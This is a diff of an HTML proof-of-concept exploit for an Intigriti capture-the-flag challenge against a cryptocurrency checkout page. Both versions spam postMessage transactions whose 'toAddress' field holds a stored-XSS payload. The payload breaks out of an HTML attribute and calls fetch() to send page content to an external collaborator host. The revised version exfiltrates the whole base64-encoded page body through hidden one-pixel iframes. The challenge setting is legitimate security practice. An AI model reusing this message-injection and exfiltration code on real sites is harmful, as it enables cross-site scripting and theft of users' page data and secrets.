@@ -1,45 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Intigriti January Challenge PoC</title>
-</head>
-<body style="background: #050A0E; color: #00FF88; font-family: monospace; text-align: center; padding-top: 50px;">
-    <h1>Initiating Heist...</h1>
-    <p>Following the trail of coins...</p>
+<head><title>Follow the Trail</title></head>
+<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;">
+    <h1>TRANSFERRING 1337COIN...</h1>
+    
+    <iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="1" height="1"></iframe>
+    
+    <iframe id="trigger" src="https://challenge-0126.intigriti.io/marketwatch.html" width="1" height="1"></iframe>
 
     <script>
-        const TARGET_URL = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
         const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
         
-        // This XSS payload breaks out of the title attribute in marketwatch.html
-        // and sends the flag text to your collaborator.
-        const XSS = `"><img src=x onerror="fetch('${COLLAB}/?flag=' + document.getElementById('flagText').innerText)">`;
+        // The Payload: Breaks out of the title attribute.
+        // It tries to grab the flag from the banner OR the cookies.
+        const XSS = `"><img src=x onerror="fetch('${COLLAB}/?flag='+btoa(document.body.innerHTML))">`;
 
-        // 1. Open the checkout page in a new window
-        const win = window.open(TARGET_URL);
+        window.onload = function() {
+            const checkoutFrame = document.getElementById('checkout').contentWindow;
 
-        // 2. Spam the postMessage every 500ms
-        // This ensures we hit the Admin's page the millisecond their wallets load
-        let count = 0;
-        const spammer = setInterval(() => {
-            win.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: XSS, // Inject XSS here
-                    currency: '1337COIN',
-                    amount: 0.00000001
-                }
-            }, '*');
-            
-            count++;
-            if (count > 20) clearInterval(spammer);
-        }, 500);
+            // Step 1: Spam the transaction to checkout.html
+            let count = 0;
+            const spammer = setInterval(() => {
+                checkoutFrame.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        currency: '1337COIN',
+                        amount: 0.0001,
+                        toAddress: XSS 
+                    }
+                }, '*');
+                count++;
+                if (count > 20) clearInterval(spammer);
+            }, 500);
 
-        // 3. After the transaction is sent, redirect the Admin to MarketWatch
-        // to trigger the stored XSS.
-        setTimeout(() => {
-            win.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
-        }, 8000);
+            // Step 2: Refresh the MarketWatch iframe to see the new "trail" (the XSS)
+            setTimeout(() => {
+                document.getElementById('trigger').src = "https://challenge-0126.intigriti.io/marketwatch.html";
+            }, 6000);
+        };
     </script>
 </body>
 </html>
